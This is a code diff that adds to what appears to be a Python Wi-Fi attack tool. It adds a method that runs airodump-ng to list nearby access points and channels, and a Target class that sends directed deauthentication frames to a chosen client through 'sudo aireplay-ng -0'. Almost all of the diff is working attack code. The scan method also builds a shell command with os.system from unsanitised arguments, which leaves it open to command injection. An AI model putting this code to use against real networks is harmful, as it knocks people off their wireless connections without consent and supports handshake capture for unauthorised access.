@@ -26,6 +26,38 @@ class Interface:
                 self.adapter = self.adapter.replace("mon","")
     def stop(self):
         self.start(mode="managed")
+    def scan_for_MACs(self) -> list:
+        command_args=""
+        if "-e" in args:
+            command_args+=f" --essid {args[args.index('-e')+1]}"
+        if "-c" in args:
+            command_args+=f" --channel {args[args.index('-c')+1]}"
+        if "-r" in args:
+            command_args+=f" --essid-regex {args[args.index('-r')+1]}"
+        print("Starting airodump-ng to get a list of BSSIDs & channels")
+        print("Press Ctrl+C when you are ready to continue")
+        countdown_sleep(5,f"Starting airodump on {self.adapter}")
+        os.system(f"sudo airodump-ng {command_args} {self.adapter} -w BSSIDs --output-format csv")
+        try:
+            input("Press Enter to continue")
+        except KeyboardInterrupt:
+            self.stop()
+            exit()
+        with open("BSSIDs-01.csv","r") as f:
+            content = f.read().split("\n")
+            whitespace_lines=[]
+            for i,line in enumerate(content):
+                if line == "":
+                    whitespace_lines.append(i)
+            content = content[2:whitespace_lines[1]]
+            list_of_BSSIDs=[]
+            for line in content:
+                if "<length" in line:
+                    continue
+                line=line.split(",")
+                BSSID,FTS,LTS,channel,Speed,Privacy,Cipher,Authentication,Power,num_beacons,IV,IP,IDlen,name,key=line
+                list_of_BSSIDs.append(f"{BSSID},{channel.strip()},{name}")
+            return list_of_BSSIDs
 class WifiNetwork:
     def __init__(self,MAC:str,channel:str or str(int),name:str) -> None:
         self.MAC = MAC
@@ -43,4 +75,20 @@ class WifiNetwork:
             print(error(f"DeAuth on {self.MAC} {self.channel} on interface {interface.interface} Failed!{RESET}\n{e}"))
         if out:
             if f"Sending DeAuth (code 7) to broadcast" in out.decode():
+                success(f"DeAuth Sent!")
+class Target:
+    def __init__(self,Client_Mac:str,Host_Network:WifiNetwork) -> None:
+        self.MAC = Client_Mac
+        self.Host_Network = Host_Network
+        self.configure_interface = self.Host_Network.configure_interface
+    def Deauth(self,interface:Interface,amount:int=1) -> None:
+        self.configure_interface(interface)
+        info(f"DeAuthing {self.MAC} on network{self.Host_Network.channel} on interface {interface.interface}")
+        out=None
+        try:
+            out=subprocess.check_output(["sudo","aireplay-ng", "-0", str(amount), "-a", self.Host_Network.MAC, "-c", self.MAC, interface.adapter])
+        except Exception as e:
+            print(error(f"DeAuth on {self.MAC} {self.Host_Network.channel} on interface {interface.interface} Failed!{RESET}\n{e}"))
+        if out:
+            if f"directed DeAuth (code 7)" in out.decode():
                 success(f"DeAuth Sent!")
